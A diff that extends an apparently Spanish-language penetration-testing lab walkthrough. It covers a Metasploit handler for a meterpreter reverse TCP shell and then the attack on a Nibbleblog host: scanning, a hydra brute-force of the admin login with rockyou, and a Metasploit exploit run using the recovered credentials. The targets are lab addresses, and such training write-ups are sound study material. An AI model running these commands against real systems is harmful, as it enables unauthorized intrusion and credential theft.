@@ -306,4 +306,48 @@ use multi/handler
 show options
 set LHOST 10.0.2.100
 set LPORT 443
+set payload windows/x64/meterpreter_reverse_tcp
+run 
+```
+
+En meterpreter.
+
+```bash
+getuid
+```
+
+## Quinta máquina
+
+Servicios vulnerables: 22 y 80.&#x20;
+
+La página nos sale el resultado de hacer ping al localhost. Hay un nombre de dominio.
+
+```bash
+nikto --url http://10.0.2.55//
+dirbuster 
+```
+
+Hay un blog de Nibbleblog.
+
+```
+searchsploit nibbleblog
+searchsploit -x 38489
+10.0.2.55/my_weblog/admin.php #página inicio sesión
+```
+
+Fuerza bruta para la enumeración.
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.55 http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect" -t 64 -F
+```
+
+Con esas credenciales nos logueamos. Vamos a Metasploit.
+
+```bash
+msfconsole
+set password kisses
+set RHOSTS 10.0.2.55
+set targeturi /my_weblog
+set username admin
+run
 ```
